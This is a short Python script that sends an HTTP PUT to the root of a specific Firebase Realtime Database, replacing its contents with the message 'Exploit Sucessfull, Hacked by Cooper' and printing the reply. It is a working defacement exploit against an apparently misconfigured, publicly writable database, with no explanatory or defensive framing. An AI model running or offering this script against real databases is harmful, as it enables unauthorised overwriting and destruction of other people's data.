import requests

data = {"Exploit":"Sucessfull","Hacked by":"Cooper"}
response = requests.put("https://api-project-58651648466.firebaseio.com/.json",json=data)
print(response.text)
